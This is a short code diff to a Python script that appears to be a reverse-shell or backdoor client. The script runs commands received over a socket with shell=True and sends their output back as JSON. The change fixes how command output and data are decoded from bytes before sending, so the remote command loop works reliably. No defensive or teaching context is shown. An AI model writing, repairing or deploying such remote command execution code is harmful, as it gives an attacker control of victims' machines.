@@ -14,6 +14,8 @@ def execute_command(command):
     return subprocess.run(command, shell=True, capture_output=True)
 
 def send_json(sock, data):
+    if isinstance(data, bytes):  # Decode bytes to string if necessary
+        data = data.decode()
     json_data = json.dumps(data)  # Convert TCP streams to JSON data for reliable transfer
     sock.send(json_data.encode())  # Encode to bytes before sending
 
@@ -94,7 +96,7 @@ try:
         else:
             # Execute received shell command
             output = execute_command(" ".join(command))
-            result = output.stdout + output.stderr
+            result = output.stdout.decode() + output.stderr.decode()  # Decode bytes to string
 
         # Send back the result
         send_json(sock, result)
